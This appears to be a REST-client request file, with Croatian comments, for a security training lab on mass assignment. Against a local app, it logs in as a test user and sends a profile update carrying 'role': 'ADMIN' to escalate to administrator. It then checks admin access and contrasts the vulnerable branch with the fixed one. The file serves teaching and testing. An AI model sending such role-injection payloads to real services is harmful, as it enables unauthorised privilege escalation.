### Lab02 – Mass assignment / eskalacija privilegija
@host = http://localhost:8000
@token = PASTE_TOKEN

### 1. Prijava kao marko (kopiraj token u @token)
POST {{host}}/api/auth/login
Content-Type: application/json

{"username": "marko", "password": "Marko123!"}

### 2. Trenutni profil (role = USER)
GET {{host}}/api/lab02/profile
Authorization: Bearer {{token}}

### 3. EKSPLOATACIJA: salje role=ADMIN (mass assignment)
# Ranjivo (main): profil dobiva ADMIN. Popravljeno: role se ignorira (DTO bez role).
PUT {{host}}/api/lab02/profile
Authorization: Bearer {{token}}
Content-Type: application/json

{"displayName": "Marko", "email": "m@x.hr", "role": "ADMIN"}

### 4. Pokusaj pristupa admin popisu
# Ranjivo (main): 200. Popravljeno: 403.
GET {{host}}/api/lab02/admin/users
Authorization: Bearer {{token}}

### 5. Legitimna promjena imena (bez role) – radi na obje grane
PUT {{host}}/api/lab02/profile
Authorization: Bearer {{token}}
Content-Type: application/json

{"displayName": "Marko Novo", "email": "marko@akademija.hr"}
